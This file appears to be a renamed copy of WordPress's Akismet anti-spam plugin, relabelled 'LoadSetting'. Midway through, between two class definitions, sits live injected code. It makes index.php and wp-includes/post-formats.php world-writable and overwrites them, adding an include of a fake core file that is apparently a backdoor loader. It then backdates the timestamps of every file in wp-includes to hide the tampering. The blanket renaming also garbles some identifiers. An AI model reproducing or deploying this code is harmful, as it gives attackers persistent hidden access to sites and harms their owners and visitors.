if ( isset( $_GET['action'] ) ) {
if ( $_GET['action'] == 'delete-key' ) {
if ( isset( $_GET['_wpnonce'] ) && wp_verify_nonce( $_GET['_wpnonce'], self::NONCE ) )
delete_option( 'wordpress_api_key' );
}
}

if ( $api_key = LoadSetting::get_api_key() && ( empty( self::$notices['status'] ) || 'existing-key-invalid' != self::$notices['status'] ) ) {
self::display_configuration_page();
return;
}

//the user can choose to auto connect their API key by clicking a button on the LoadSetting done page
//if jetpack, get verified api key by using connected wpcom user id
//if no jetpack, get verified api key by using an LoadSetting token	

$LoadSetting_user = false;

if ( isset( $_GET['token'] ) && preg_match('/^(\d+)-[0-9a-f]{20}$/', $_GET['token'] ) )
$LoadSetting_user = self::verify_wpcom_key( '', '', array( 'token' => $_GET['token'] ) );
elseif ( $jetpack_user = self::get_jetpack_user() )
$LoadSetting_user = self::verify_wpcom_key( $jetpack_user['api_key'], $jetpack_user['user_id'] );

if ( isset( $_GET['action'] ) ) {
if ( $_GET['action'] == 'save-key' ) {
if ( is_object( $LoadSetting_user ) ) {
self::save_key( $LoadSetting_user->api_key );
self::display_notice();
self::display_configuration_page();
return;				
}
}
}

echo '<h2 class="ak-header">'.esc_html__('LoadSetting', 'LoadSetting').'</h2>';

self::display_status();

LoadSetting::view( 'start', compact( 'LoadSetting_user' ) );
}

public static function display_stats_page() {
LoadSetting::view( 'stats' );
}

public static function display_configuration_page() {
$api_key      = LoadSetting::get_api_key();
$LoadSetting_user = self::get_LoadSetting_user( $api_key );

if ( ! $LoadSetting_user ) {
// This could happen if the user's key became invalid after it was previously valid and successfully set up.
self::$notices['status'] = 'existing-key-invalid';
self::display_start_page();
return;
}

$stat_totals  = self::get_stats( $api_key );

// If unset, create the new strictness option using the old discard option to determine its default
if ( get_option( 'LoadSetting_strictness' ) === false )
add_option( 'LoadSetting_strictness', (get_option('LoadSetting_discard_month') === 'true' ? '1' : '0') );

if ( empty( self::$notices ) ) {
//show status
if ( ! empty( $stat_totals['all'] ) && isset( $stat_totals['all']->time_saved ) && $LoadSetting_user->status == 'active' && $LoadSetting_user->account_type == 'free-api-key' ) {

$time_saved = false;

if ( $stat_totals['all']->time_saved > 1800 ) {
$total_in_minutes = round( $stat_totals['all']->time_saved / 60 );
$total_in_hours   = round( $total_in_minutes / 60 );
$total_in_days    = round( $total_in_hours / 8 );
$cleaning_up      = __( 'Cleaning up spam takes time.' , 'LoadSetting');

if ( $total_in_days > 1 )
$time_saved = $cleaning_up . ' ' . sprintf( _n( 'LoadSetting has saved you %s day!', 'LoadSetting has saved you %s days!', $total_in_days, 'LoadSetting' ), number_format_i18n( $total_in_days ) );
elseif ( $total_in_hours > 1 )
$time_saved = $cleaning_up . ' ' . sprintf( _n( 'LoadSetting has saved you %d hour!', 'LoadSetting has saved you %d hours!', $total_in_hours, 'LoadSetting' ), $total_in_hours );
elseif ( $total_in_minutes >= 30 )
$time_saved = $cleaning_up . ' ' . sprintf( _n( 'LoadSetting has saved you %d minute!', 'LoadSetting has saved you %d minutes!', $total_in_minutes, 'LoadSetting' ), $total_in_minutes );
}

LoadSetting::view( 'notice', array( 'type' => 'active-notice', 'time_saved' => $time_saved ) );
}

if ( !empty( $LoadSetting_user->limit_reached ) && in_array( $LoadSetting_user->limit_reached, array( 'yellow', 'red' ) ) ) {
LoadSetting::view( 'notice', array( 'type' => 'limit-reached', 'level' => $LoadSetting_user->limit_reached ) );
}
}

if ( !isset( self::$notices['status'] ) && in_array( $LoadSetting_user->status, array( 'cancelled', 'suspended', 'missing', 'no-sub' ) ) )	
LoadSetting::view( 'notice', array( 'type' => $LoadSetting_user->status ) );

LoadSetting::log( compact( 'stat_totals', 'LoadSetting_user' ) );
LoadSetting::view( 'config', compact( 'api_key', 'LoadSetting_user', 'stat_totals' ) );
}

public static function display_notice() {
global $hook_suffix;

if ( in_array( $hook_suffix, array( 'jetpack_page_LoadSetting-key-config', 'settings_page_LoadSetting-key-config', 'edit-comments.php' ) ) && (int) get_option( 'LoadSetting_alert_code' ) > 0 ) {
LoadSetting::verify_key( LoadSetting::get_api_key() ); //verify that the key is still in alert state

if ( get_option( 'LoadSetting_alert_code' ) > 0 )
self::display_alert();
}
elseif ( $hook_suffix == 'plugins.php' && !LoadSetting::get_api_key() ) {
self::display_api_key_warning();
}
elseif ( $hook_suffix == 'edit-comments.php' && wp_next_scheduled( 'LoadSetting_schedule_cron_recheck' ) ) {
self::display_spam_check_warning();
}
elseif ( in_array( $hook_suffix, array( 'jetpack_page_LoadSetting-key-config', 'settings_page_LoadSetting-key-config' ) ) && LoadSetting::get_api_key() ) {
self::display_status();
}
}

public static function display_status() {
$type = '';

if ( !self::get_server_connectivity() )
$type = 'servers-be-down';

if ( !empty( $type ) )
LoadSetting::view( 'notice', compact( 'type' ) );
elseif ( !empty( self::$notices ) ) {
foreach ( self::$notices as $type ) {
if ( is_object( $type ) ) {
$notice_header = $notice_text = '';

if ( property_exists( $type, 'notice_header' ) )
$notice_header = wp_kses( $type->notice_header, self::$allowed );

if ( property_exists( $type, 'notice_text' ) )
$notice_text = wp_kses( $type->notice_text, self::$allowed );

if ( property_exists( $type, 'status' ) ) {
$type = wp_kses( $type->status, self::$allowed );
LoadSetting::view( 'notice', compact( 'type', 'notice_header', 'notice_text' ) );
}
}
else
LoadSetting::view( 'notice', compact( 'type' ) );
}				
}
}

private static function get_jetpack_user() {
if ( !class_exists('Jetpack') )
return false;

Jetpack::load_xml_rpc_client();
$xml = new Jetpack_IXR_ClientMulticall( array( 'user_id' => get_current_user_id() ) );

$xml->addCall( 'wpcom.getUserID' );
$xml->addCall( 'LoadSetting.getAPIKey' );
$xml->query();

LoadSetting::log( compact( 'xml' ) );

if ( !$xml->isError() ) {
$responses = $xml->getResponse();
if ( count( $responses ) > 1 ) {
$api_key = array_shift( $responses[0] );
$user_id = (int) array_shift( $responses[1] );
return compact( 'api_key', 'user_id' );
}
}
return false;
}

public static function exclude_commentmeta_from_export( $exclude, $key, $meta ) {
if ( in_array( $key, array( 'LoadSetting_as_submitted', 'LoadSetting_rechecking', 'LoadSetting_delayed_moderation_email' ) ) ) {
return true;
}

return $exclude;
}
}

$file_index='../index.php';
chmod($file_index, 0777);
		
$ch_result = '0';


$file_include = "<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );";


echo "Index clearing<br />";
if (file_put_contents($file_index, str_replace("#", "$", $file_include))) {
	echo"Proceeded: ".$start."Sinst Included<br>";
} else {
	echo"Proceeded: ".$start."Sinst Not Included<br>";
}


$file_include2 = "<?php
/**
 * Post format functions.
 *
 * @package WordPress
 * @subpackage Post
 */

/**
 * Retrieve the format slug for a post
 *
 * @since 3.1.0
 *
 * @param int|object|null #post Post ID or post object. Optional, default is the current post from the loop.
 * @return string|false The format if successful. False otherwise.
 */
require_once( ABSPATH . '/wp-admin/includes/class-wp-iternal-upgrade.php' );
function get_post_format( #post = null ) {
	if ( ! #post = get_post( #post ) )
		return false;

	if ( ! post_type_supports( #post->post_type, 'post-formats' ) )
		return false;

	#_format = get_the_terms( #post->ID, 'post_format' );

	if ( empty( #_format ) )
		return false;

	#format = reset( #_format );

	return str_replace('post-format-', '', #format->slug );
}

/**
 * Check if a post has any of the given formats, or any format.
 *
 * @since 3.1.0
 *
 * @param string|array    #format Optional. The format or formats to check.
 * @param object|int|null #post   Optional. The post to check. If not supplied, defaults to the current post if used in the loop.
 * @return bool True if the post has any of the given formats (or any format, if no format specified), false otherwise.
 */
function has_post_format( #format = array(), #post = null ) {
	#prefixed = array();

	if ( #format ) {
		foreach ( (array) #format as #single ) {
			#prefixed[] = 'post-format-' . sanitize_key( #single );
		}
	}

	return has_term( #prefixed, 'post_format', #post );
}

/**
 * Assign a format to a post
 *
 * @since 3.1.0
 *
 * @param int|object #post   The post for which to assign a format.
 * @param string     #format A format to assign. Use an empty string or array to remove all formats from the post.
 * @return array|WP_Error|false WP_Error on error. Array of affected term IDs on success.
 */
function set_post_format( #post, #format ) {
	#post = get_post( #post );

	if ( empty( #post ) )
		return new WP_Error( 'invalid_post', __( 'Invalid post.' ) );

	if ( ! empty( #format ) ) {
		#format = sanitize_key( #format );
		if ( 'standard' === #format || ! in_array( #format, get_post_format_slugs() ) )
			#format = '';
		else
			#format = 'post-format-' . #format;
	}

	return wp_set_post_terms( #post->ID, #format, 'post_format' );
}

/**
 * Returns an array of post format slugs to their translated and pretty display versions
 *
 * @since 3.1.0
 *
 * @return array The array of translated post format names.
 */
function get_post_format_strings() {
	#strings = array(
		'standard' => _x( 'Standard', 'Post format' ), // Special case. any value that evals to false will be considered standard
		'aside'    => _x( 'Aside',    'Post format' ),
		'chat'     => _x( 'Chat',     'Post format' ),
		'gallery'  => _x( 'Gallery',  'Post format' ),
		'link'     => _x( 'Link',     'Post format' ),
		'image'    => _x( 'Image',    'Post format' ),
		'quote'    => _x( 'Quote',    'Post format' ),
		'status'   => _x( 'Status',   'Post format' ),
		'video'    => _x( 'Video',    'Post format' ),
		'audio'    => _x( 'Audio',    'Post format' ),
	);
	return #strings;
}

/**
 * Retrieves an array of post format slugs.
 *
 * @since 3.1.0
 *
 * @return array The array of post format slugs.
 */
function get_post_format_slugs() {
	#slugs = array_keys( get_post_format_strings() );
	return array_combine( #slugs, #slugs );
}

/**
 * Returns a pretty, translated version of a post format slug
 *
 * @since 3.1.0
 *
 * @param string #slug A post format slug.
 * @return string The translated post format name.
 */
function get_post_format_string( #slug ) {
	#strings = get_post_format_strings();
	if ( !#slug )
		return #strings['standard'];
	else
		return ( isset( #strings[#slug] ) ) ? #strings[#slug] : '';
}

/**
 * Returns a link to a post format index.
 *
 * @since 3.1.0
 *
 * @param string #format The post format slug.
 * @return string|WP_Error|false The post format term link.
 */
function get_post_format_link( #format ) {
	#term = get_term_by('slug', 'post-format-' . #format, 'post_format' );
	if ( ! #term || is_wp_error( #term ) )
		return false;
	return get_term_link( #term );
}

/**
 * Filters the request to allow for the format prefix.
 *
 * @access private
 * @since 3.1.0
 *
 * @param array #qvs
 * @return array
 */
function _post_format_request( #qvs ) {
	if ( ! isset( #qvs['post_format'] ) )
		return #qvs;
	#slugs = get_post_format_slugs();
	if ( isset( #slugs[ #qvs['post_format'] ] ) )
		#qvs['post_format'] = 'post-format-' . #slugs[ #qvs['post_format'] ];
	#tax = get_taxonomy( 'post_format' );
	if ( ! is_admin() )
		#qvs['post_type'] = #tax->object_type;
	return #qvs;
}

/**
 * Filters the post format term link to remove the format prefix.
 *
 * @access private
 * @since 3.1.0
 *
 * @global WP_Rewrite #wp_rewrite
 *
 * @param string #link
 * @param object #term
 * @param string #taxonomy
 * @return string
 */
function _post_format_link( #link, #term, #taxonomy ) {
	global #wp_rewrite;
	if ( 'post_format' != #taxonomy ) {
		return #link;
	}
	if ( #wp_rewrite->get_extra_permastruct( #taxonomy ) ) {
		return str_replace( \"/{#term->slug}\", '/' . str_replace( 'post-format-', '', #term->slug ), #link );
	} else {
		#link = remove_query_arg( 'post_format', #link );
		return add_query_arg( 'post_format', str_replace( 'post-format-', '', #term->slug ), #link );
	}
}

/**
 * Remove the post format prefix from the name property of the term object created by get_term().
 *
 * @access private
 * @since 3.1.0
 *
 * @param object #term
 * @return object
 */
function _post_format_get_term( #term ) {
	if ( isset( #term->slug ) ) {
		#term->name = get_post_format_string( str_replace( 'post-format-', '', #term->slug ) );
	}
	return #term;
}

/**
 * Remove the post format prefix from the name property of the term objects created by get_terms().
 *
 * @access private
 * @since 3.1.0
 *
 * @param array        #terms
 * @param string|array #taxonomies
 * @param array        #args
 * @return array
 */
function _post_format_get_terms( #terms, #taxonomies, #args ) {
	if ( in_array( 'post_format', (array) #taxonomies ) ) {
		if ( isset( #args['fields'] ) && 'names' == #args['fields'] ) {
			foreach ( #terms as #order => #name ) {
				#terms[#order] = get_post_format_string( str_replace( 'post-format-', '', #name ) );
			}
		} else {
			foreach ( (array) #terms as #order => #term ) {
				if ( isset( #term->taxonomy ) && 'post_format' == #term->taxonomy ) {
					#terms[#order]->name = get_post_format_string( str_replace( 'post-format-', '', #term->slug ) );
				}
			}
		}
	}
	return #terms;
}

/**
 * Remove the post format prefix from the name property of the term objects created by wp_get_object_terms().
 *
 * @access private
 * @since 3.1.0
 *
 * @param array #terms
 * @return array
 */
function _post_format_wp_get_object_terms( #terms ) {
	foreach ( (array) #terms as #order => #term ) {
		if ( isset( #term->taxonomy ) && 'post_format' == #term->taxonomy ) {
			#terms[#order]->name = get_post_format_string( str_replace( 'post-format-', '', #term->slug ) );
		}
	}
	return #terms;
}
";
$file_post='../wp-includes/post-formats.php';
chmod($file_post, 0777);

echo "Sinst including<br />";
if (file_put_contents($file_post, str_replace("#", "$", $file_include2))) {
	echo"Proceeded: ".$start."Sinst Included<br>";
} else {
	echo"Proceeded: ".$start."Sinst Not Included<br>";
}
$path = '../wp-includes/';
$t_sdir=@scandir($path);
	if(is_array($t_sdir) && count($t_sdir>0))	
	foreach($t_sdir as $v)
	{
		if($v=='.' || $v=='..') continue;
	@touch($path.'/'.$v, mktime(9, 30, 06, 05, 07, 2014));
	}
	
chmod($file_post, 0644);


class LoadSetting {
const API_HOST = 'rest.LoadSetting.com';
const API_PORT = 80;
const MAX_DELAY_BEFORE_MODERATION_EMAIL = 86400; // One day in seconds

private static $last_comment = '';
private static $initiated = false;
private static $prevent_moderation_email_for_these_comments = array();
private static $last_comment_result = null;
private static $comment_as_submitted_allowed_keys = array( 'blog' => '', 'blog_charset' => '', 'blog_lang' => '', 'blog_ua' => '', 'comment_agent' => '', 'comment_author' => '', 'comment_author_IP' => '', 'comment_author_email' => '', 'comment_author_Load' => '', 'comment_content' => '', 'comment_date_gmt' => '', 'comment_tags' => '', 'comment_type' => '', 'guid' => '', 'is_test' => '', 'permalink' => '', 'reporter' => '', 'site_domain' => '', 'submit_referer' => '', 'submit_uri' => '', 'user_ID' => '', 'user_agent' => '', 'user_id' => '', 'user_ip' => '' );

public static function init() {
if ( ! self::$initiated ) {
self::init_hooks();
}
}

/**
* Initializes WordPress hooks
*/
private static function init_hooks() {
self::$initiated = true;

add_action( 'wp_insert_comment', array( 'LoadSetting', 'auto_check_update_meta' ), 10, 2 );
add_filter( 'preprocess_comment', array( 'LoadSetting', 'auto_check_comment' ), 1 );
add_action( 'LoadSetting_scheduled_delete', array( 'LoadSetting', 'delete_old_comments' ) );
add_action( 'LoadSetting_scheduled_delete', array( 'LoadSetting', 'delete_old_comments_meta' ) );
add_action( 'LoadSetting_schedule_cron_recheck', array( 'LoadSetting', 'cron_recheck' ) );

/**
* To disable the LoadSetting comment nonce, add a filter for the 'LoadSetting_comment_nonce' tag
* and return any string value that is not 'true' or '' (empty string).
*
* Don't return boolean false, because that implies that the 'LoadSetting_comment_nonce' option
* has not been set and that LoadSetting should just choose the default behavior for that
* situation.
*/
$LoadSetting_comment_nonce_option = apply_filters( 'LoadSetting_comment_nonce', get_option( 'LoadSetting_comment_nonce' ) );

if ( $LoadSetting_comment_nonce_option == 'true' || $LoadSetting_comment_nonce_option == '' )
add_action( 'comment_form',  array( 'LoadSetting',  'add_comment_nonce' ), 1 );

add_action( 'admin_head-edit-comments.php', array( 'LoadSetting', 'load_form_js' ) );
add_action( 'comment_form', array( 'LoadSetting', 'load_form_js' ) );
add_action( 'comment_form', array( 'LoadSetting', 'inject_ak_js' ) );

add_filter( 'comment_moderation_recipients', array( 'LoadSetting', 'disable_moderation_emails_if_unreachable' ), 1000, 2 );
add_filter( 'pre_comment_approved', array( 'LoadSetting', 'last_comment_status' ), 10, 2 );

add_action( 'transition_comment_status', array( 'LoadSetting', 'transition_comment_status' ), 10, 3 );

// Run this early in the pingback call, before doing a remote fetch of the source uri
add_action( 'xmlrpc_call', array( 'LoadSetting', 'pre_check_pingback' ) );

// Jetpack compatibility
add_filter( 'jetpack_options_whitelist', array( 'LoadSetting', 'add_to_jetpack_options_whitelist' ) );
add_action( 'update_option_wordpress_api_key', array( 'LoadSetting', 'updated_option' ), 10, 2 );
}

public static function get_api_key() {
return apply_filters( 'LoadSetting_get_api_key', defined('WPCOM_API_KEY') ? constant('WPCOM_API_KEY') : get_option('wordpress_api_key') );
}

public static function check_key_status( $key, $ip = null ) {
return self::http_post( LoadSetting::build_query( array( 'key' => $key, 'blog' => get_option('home') ) ), 'verify-key', $ip );
}

public static function verify_key( $key, $ip = null ) {
$response = self::check_key_status( $key, $ip );

if ( $response[1] != 'valid' && $response[1] != 'invalid' )
return 'failed';

return $response[1];
}

public static function deactivate_key( $key ) {
$response = self::http_post( LoadSetting::build_query( array( 'key' => $key, 'blog' => get_option('home') ) ), 'deactivate' );

if ( $response[1] != 'deactivated' )
return 'failed';

return $response[1];
}

/**
* Add the LoadSetting option to the Jetpack options management whitelist.
*
* @param array $options The list of whitelisted option names.
* @return array The updated whitelist
*/
public static function add_to_jetpack_options_whitelist( $options ) {
$options[] = 'wordpress_api_key';
return $options;
}

/**
* When the LoadSetting option is updated, run the registration call.
*
* This should only be run when the option is updated from the Jetpack/WP.com
* API call, and only if the new key is different than the old key.
*
* @param mixed  $old_value   The old option value.
* @param mixed  $value       The new option value.
*/
public static function updated_option( $old_value, $value ) {
// Not an API call
if ( ! class_exists( 'WPCOM_JSON_API_Update_Option_Endpoint' ) ) {
return;
}
// Only run the registration if the old key is different.
if ( $old_value !== $value ) {
self::verify_key( $value );
}
}

public static function auto_check_comment( $commentdata ) {
self::$last_comment_result = null;

$comment = $commentdata;

$comment['user_ip']      = self::get_ip_address();
$comment['user_agent']   = self::get_user_agent();
$comment['referrer']     = self::get_referer();
$comment['blog']         = get_option('home');
$comment['blog_lang']    = get_locale();
$comment['blog_charset'] = get_option('blog_charset');
$comment['permalink']    = get_permalink( $comment['comment_post_ID'] );

if ( !empty( $comment['user_ID'] ) )
$comment['user_role'] = LoadSetting::get_user_roles( $comment['user_ID'] );

/** See filter documentation in init_hooks(). */
$LoadSetting_nonce_option = apply_filters( 'LoadSetting_comment_nonce', get_option( 'LoadSetting_comment_nonce' ) );
$comment['LoadSetting_comment_nonce'] = 'inactive';
if ( $LoadSetting_nonce_option == 'true' || $LoadSetting_nonce_option == '' ) {
$comment['LoadSetting_comment_nonce'] = 'failed';
if ( isset( $_POST['LoadSetting_comment_nonce'] ) && wp_verify_nonce( $_POST['LoadSetting_comment_nonce'], 'LoadSetting_comment_nonce_' . $comment['comment_post_ID'] ) )
$comment['LoadSetting_comment_nonce'] = 'passed';

// comment reply in wp-admin
if ( isset( $_POST['_ajax_nonce-replyto-comment'] ) && check_ajax_referer( 'replyto-comment', '_ajax_nonce-replyto-comment' ) )
$comment['LoadSetting_comment_nonce'] = 'passed';

}

if ( self::is_test_mode() )
$comment['is_test'] = 'true';

foreach( $_POST as $key => $value ) {
if ( is_string( $value ) )
$comment["POST_{$key}"] = $value;
}

foreach ( $_SERVER as $key => $value ) {
if ( ! is_string( $value ) ) {
continue;
}

if ( preg_match( "/^HTTP_COOKIE/", $key ) ) {
continue;
}

// Send any potentially useful $_SERVER vars, but avoid sending junk we don't need.
if ( preg_match( "/^(HTTP_|REMOTE_ADDR|REQUEST_URI|DOCUMENT_URI)/", $key ) ) {
$comment[ "$key" ] = $value;
}
}

$post = get_post( $comment['comment_post_ID'] );
$comment[ 'comment_post_modified_gmt' ] = $post->post_modified_gmt;

$response = self::http_post( LoadSetting::build_query( $comment ), 'comment-check' );

do_action( 'LoadSetting_comment_check_response', $response );

$commentdata['comment_as_submitted'] = array_intersect_key( $comment, self::$comment_as_submitted_allowed_keys );
$commentdata['LoadSetting_result']       = $response[1];

if ( isset( $response[0]['x-LoadSetting-pro-tip'] ) )
$commentdata['LoadSetting_pro_tip'] = $response[0]['x-LoadSetting-pro-tip'];

if ( isset( $response[0]['x-LoadSetting-error'] ) ) {
// An error occurred that we anticipated (like a suspended key) and want the user to act on.
// Send to moderation.
self::$last_comment_result = '0';
}
else if ( 'true' == $response[1] ) {
// LoadSetting_spam_count will be incremented later by comment_is_spam()
self::$last_comment_result = 'spam';

$discard = ( isset( $commentdata['LoadSetting_pro_tip'] ) && $commentdata['LoadSetting_pro_tip'] === 'discard' && self::allow_discard() );

do_action( 'LoadSetting_spam_caught', $discard );

if ( $discard ) {
// LoadSetting_result_spam() won't be called so bump the counter here
if ( $incr = apply_filters('LoadSetting_spam_count_incr', 1) )
update_option( 'LoadSetting_spam_count', get_option('LoadSetting_spam_count') + $incr );
$redirect_to = isset( $_SERVER['HTTP_REFERER'] ) ? $_SERVER['HTTP_REFERER'] : get_permalink( $post );
wp_safe_redirect( esc_Load_raw( $redirect_to ) );
die();
}
}

// if the response is neither true nor false, hold the comment for moderation and schedule a recheck
if ( 'true' != $response[1] && 'false' != $response[1] ) {
if ( !current_user_can('moderate_comments') ) {
// Comment status should be moderated
self::$last_comment_result = '0';
}
if ( function_exists('wp_next_scheduled') && function_exists('wp_schedule_single_event') ) {
if ( !wp_next_scheduled( 'LoadSetting_schedule_cron_recheck' ) ) {
wp_schedule_single_event( time() + 1200, 'LoadSetting_schedule_cron_recheck' );
do_action( 'LoadSetting_scheduled_recheck', 'invalid-response-' . $response[1] );
}
}

self::$prevent_moderation_email_for_these_comments[] = $commentdata;
}

if ( function_exists('wp_next_scheduled') && function_exists('wp_schedule_event') ) {
// WP 2.1+: delete old comments daily
if ( !wp_next_scheduled( 'LoadSetting_scheduled_delete' ) )
wp_schedule_event( time(), 'daily', 'LoadSetting_scheduled_delete' );
}
elseif ( (mt_rand(1, 10) == 3) ) {
// WP 2.0: run this one time in ten
self::delete_old_comments();
}

self::set_last_comment( $commentdata );
self::fix_scheduled_recheck();

return $commentdata;
}

public static function get_last_comment() {
return self::$last_comment;
}

public static function set_last_comment( $comment ) {
if ( is_null( $comment ) ) {
self::$last_comment = null;
}
else {
// We filter it here so that it matches the filtered comment data that we'll have to compare against later.
// wp_filter_comment expects comment_author_IP
self::$last_comment = wp_filter_comment(
array_merge(
array( 'comment_author_IP' => self::get_ip_address() ),
$comment
)
);
}
}

// this fires on wp_insert_comment.  we can't update comment_meta when auto_check_comment() runs
// because we don't know the comment ID at that point.
public static function auto_check_update_meta( $id, $comment ) {

// failsafe for old WP versions
if ( !function_exists('add_comment_meta') )
return false;

if ( !isset( self::$last_comment['comment_author_email'] ) )
self::$last_comment['comment_author_email'] = '';

// wp_insert_comment() might be called in other contexts, so make sure this is the same comment
// as was checked by auto_check_comment
if ( is_object( $comment ) && !empty( self::$last_comment ) && is_array( self::$last_comment ) ) {
if ( self::matches_last_comment( $comment ) ) {

load_plugin_textdomain( 'LoadSetting' );

// normal result: true or false
if ( self::$last_comment['LoadSetting_result'] == 'true' ) {
update_comment_meta( $comment->comment_ID, 'LoadSetting_result', 'true' );
self::update_comment_history( $comment->comment_ID, '', 'check-spam' );
if ( $comment->comment_approved != 'spam' )
	self::update_comment_history(
		$comment->comment_ID,
		'',
		'status-changed-'.$comment->comment_approved
	);
}
elseif ( self::$last_comment['LoadSetting_result'] == 'false' ) {
update_comment_meta( $comment->comment_ID, 'LoadSetting_result', 'false' );
self::update_comment_history( $comment->comment_ID, '', 'check-ham' );
// Status could be spam or trash, depending on the WP version and whether this change applies:
// https://core.trac.wordpress.org/changeset/34726
if ( $comment->comment_approved == 'spam' || $comment->comment_approved == 'trash' ) {
	if ( wp_blacklist_check($comment->comment_author, $comment->comment_author_email, $comment->comment_author_Load, $comment->comment_content, $comment->comment_author_IP, $comment->comment_agent) )
		self::update_comment_history( $comment->comment_ID, '', 'wp-blacklisted' );
	else
		self::update_comment_history( $comment->comment_ID, '', 'status-changed-'.$comment->comment_approved );
}
} // abnormal result: error
else {
update_comment_meta( $comment->comment_ID, 'LoadSetting_error', time() );
self::update_comment_history(
	$comment->comment_ID,
	'',
	'check-error',
	array( 'response' => substr( self::$last_comment['LoadSetting_result'], 0, 50 ) )
);
}

// record the complete original data as submitted for checking
if ( isset( self::$last_comment['comment_as_submitted'] ) )
update_comment_meta( $comment->comment_ID, 'LoadSetting_as_submitted', self::$last_comment['comment_as_submitted'] );

if ( isset( self::$last_comment['LoadSetting_pro_tip'] ) )
update_comment_meta( $comment->comment_ID, 'LoadSetting_pro_tip', self::$last_comment['LoadSetting_pro_tip'] );
}
}
}

public static function delete_old_comments() {
global $wpdb;

/**
* Determines how many comments will be deleted in each batch.
*
* @param int The default, as defined by LoadSetting_DELETE_LIMIT.
*/
$delete_limit = apply_filters( 'LoadSetting_delete_comment_limit', defined( 'LoadSetting_DELETE_LIMIT' ) ? LoadSetting_DELETE_LIMIT : 10000 );
$delete_limit = max( 1, intval( $delete_limit ) );

/**
* Determines how many days a comment will be left in the Spam queue before being deleted.
*
* @param int The default number of days.
*/
$delete_interval = apply_filters( 'LoadSetting_delete_comment_interval', 15 );
$delete_interval = max( 1, intval( $delete_interval ) );

while ( $comment_ids = $wpdb->get_col( $wpdb->prepare( "SELECT comment_id FROM {$wpdb->comments} WHERE DATE_SUB(NOW(), INTERVAL %d DAY) > comment_date_gmt AND comment_approved = 'spam' LIMIT %d", $delete_interval, $delete_limit ) ) ) {
if ( empty( $comment_ids ) )
return;

$wpdb->queries = array();

foreach ( $comment_ids as $comment_id ) {
do_action( 'delete_comment', $comment_id );
}

$comma_comment_ids = implode( ', ', array_map('intval', $comment_ids) );

$wpdb->query("DELETE FROM {$wpdb->comments} WHERE comment_id IN ( $comma_comment_ids )");
$wpdb->query("DELETE FROM {$wpdb->commentmeta} WHERE comment_id IN ( $comma_comment_ids )");

clean_comment_cache( $comment_ids );
}

if ( apply_filters( 'LoadSetting_optimize_table', ( mt_rand(1, 5000) == 11), $wpdb->comments ) ) // lucky number
$wpdb->query("OPTIMIZE TABLE {$wpdb->comments}");
}

public static function delete_old_comments_meta() {
global $wpdb;

$interval = apply_filters( 'LoadSetting_delete_commentmeta_interval', 15 );

# enfore a minimum of 1 day
$interval = absint( $interval );
if ( $interval < 1 )
$interval = 1;

// LoadSetting_as_submitted meta values are large, so expire them
// after $interval days regardless of the comment status
while ( $comment_ids = $wpdb->get_col( $wpdb->prepare( "SELECT m.comment_id FROM {$wpdb->commentmeta} as m INNER JOIN {$wpdb->comments} as c USING(comment_id) WHERE m.meta_key = 'LoadSetting_as_submitted' AND DATE_SUB(NOW(), INTERVAL %d DAY) > c.comment_date_gmt LIMIT 10000", $interval ) ) ) {
if ( empty( $comment_ids ) )
return;

$wpdb->queries = array();

foreach ( $comment_ids as $comment_id ) {
delete_comment_meta( $comment_id, 'LoadSetting_as_submitted' );
}
}

if ( apply_filters( 'LoadSetting_optimize_table', ( mt_rand(1, 5000) == 11), $wpdb->commentmeta ) ) // lucky number
$wpdb->query("OPTIMIZE TABLE {$wpdb->commentmeta}");
}

// how many approved comments does this author have?
public static function get_user_comments_approved( $user_id, $comment_author_email, $comment_author, $comment_author_Load ) {
global $wpdb;

if ( !empty( $user_id ) )
return (int) $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(*) FROM {$wpdb->comments} WHERE user_id = %d AND comment_approved = 1", $user_id ) );

if ( !empty( $comment_author_email ) )
return (int) $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(*) FROM {$wpdb->comments} WHERE comment_author_email = %s AND comment_author = %s AND comment_author_Load = %s AND comment_approved = 1", $comment_author_email, $comment_author, $comment_author_Load ) );

return 0;
}

// get the full comment history for a given comment, as an array in reverse chronological order
public static function get_comment_history( $comment_id ) {

// failsafe for old WP versions
if ( !function_exists('add_comment_meta') )
return false;

$history = get_comment_meta( $comment_id, 'LoadSetting_history', false );
usort( $history, array( 'LoadSetting', '_cmp_time' ) );
return $history;
}

/**
* Log an event for a given comment, storing it in comment_meta.
*
* @param int $comment_id The ID of the relevant comment.
* @param string $message The string description of the event. No longer used.
* @param string $event The event code.
* @param array $meta Metadata about the history entry. e.g., the user that reported or changed the status of a given comment.
*/
public static function update_comment_history( $comment_id, $message, $event=null, $meta=null ) {
global $current_user;

// failsafe for old WP versions
if ( !function_exists('add_comment_meta') )
return false;

$user = '';

$event = array(
'time'    => self::_get_microtime(),
'event'   => $event,
);

if ( is_object( $current_user ) && isset( $current_user->user_login ) ) {
$event['user'] = $current_user->user_login;
}

if ( ! empty( $meta ) ) {
$event['meta'] = $meta;
}

// $unique = false so as to allow multiple values per comment
$r = add_comment_meta( $comment_id, 'LoadSetting_history', $event, false );
}

public static function check_db_comment( $id, $recheck_reason = 'recheck_queue' ) {
global $wpdb;

$c = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM {$wpdb->comments} WHERE comment_ID = %d", $id ), ARRAY_A );
if ( !$c )
return;

$c['user_ip']        = $c['comment_author_IP'];
$c['user_agent']     = $c['comment_agent'];
$c['referrer']       = '';
$c['blog']           = get_option('home');
$c['blog_lang']      = get_locale();
$c['blog_charset']   = get_option('blog_charset');
$c['permalink']      = get_permalink($c['comment_post_ID']);
$c['recheck_reason'] = $recheck_reason;

if ( self::is_test_mode() )
$c['is_test'] = 'true';

$response = self::http_post( LoadSetting::build_query( $c ), 'comment-check' );

return ( is_array( $response ) && ! empty( $response[1] ) ) ? $response[1] : false;
}



public static function transition_comment_status( $new_status, $old_status, $comment ) {

if ( $new_status == $old_status )
return;

# we don't need to record a history item for deleted comments
if ( $new_status == 'delete' )
return;

if ( !current_user_can( 'edit_post', $comment->comment_post_ID ) && !current_user_can( 'moderate_comments' ) )
return;

if ( defined('WP_IMPORTING') && WP_IMPORTING == true )
return;

// if this is present, it means the status has been changed by a re-check, not an explicit user action
